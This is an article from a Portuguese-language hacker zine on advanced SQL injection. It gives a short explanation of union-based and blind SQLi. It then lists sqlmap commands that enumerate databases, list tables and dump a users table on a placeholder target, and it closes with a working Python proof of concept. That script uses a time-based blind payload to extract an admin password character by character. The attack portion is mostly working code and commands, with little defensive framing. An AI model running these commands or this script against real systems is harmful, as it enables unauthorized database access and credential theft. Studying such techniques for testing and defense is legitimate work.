---
title: "0x07_SQL_Injection_Avançado"
author: "Brenno Miranda"
edition: "dmp 0x3"
translationKey: "zine_sqli_avancado"
---

## --[ Sumário
- 0 -> [SQL Injection Nunca Morreu]
- 1 -> [Union-Based vs Blind SQLi]
- 2 -> [Automação com sqlmap]
- 3 -> [PoC: Extraindo Dados via Time-Based Blind]
- 4 -> [Encerramento e Créditos]

### 0 - SQL Injection Nunca Morreu

Salve!

Apesar de ser uma vulnerabilidade conhecida há mais de 20 anos, SQL Injection continua no top 10 do OWASP. O motivo é simples: desenvolvedores ainda concatenam inputs do usuário diretamente em queries SQL. E quando isso acontece, um atacante pode manipular a lógica da consulta.

### 1 - Union-Based vs Blind SQLi

No union-based, a resposta do banco é refletida diretamente na página. No blind, precisamos inferir dados através de perguntas booleanas ou atrasos no tempo de resposta.

### 2 - Automação com sqlmap

O sqlmap é a ferramenta padrão para detecção e exploração de SQLi:

```bash
# Detectar SQLi em um parâmetro
sqlmap -u "http://target.com/page?id=1" --batch --dbs

# Extrair tabelas do banco de dados
sqlmap -u "http://target.com/page?id=1" -D webapp --tables

# Dump de dados específicos
sqlmap -u "http://target.com/page?id=1" -D webapp -T users --dump
```

### 3 - PoC: Extraindo Dados via Time-Based Blind

Quando não há output visível, podemos usar `SLEEP()` para inferir dados bit a bit:

```python
#!/usr/bin/env python3
import requests
import time

url = "http://target.com/login"
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
extracted = ""

for pos in range(1, 32):
    for char in charset:
        payload = f"admin' AND IF(SUBSTRING(password,{pos},1)='{char}',SLEEP(2),0)-- -"
        start = time.time()
        requests.post(url, data={"username": payload, "password": "x"})
        elapsed = time.time() - start
        
        if elapsed >= 2:
            extracted += char
            print(f"[+] Posição {pos}: {char} -> {extracted}")
            break

print(f"[*] Password extraída: {extracted}")
```

_Figura 1. Script de extração via Time-Based Blind SQLi._
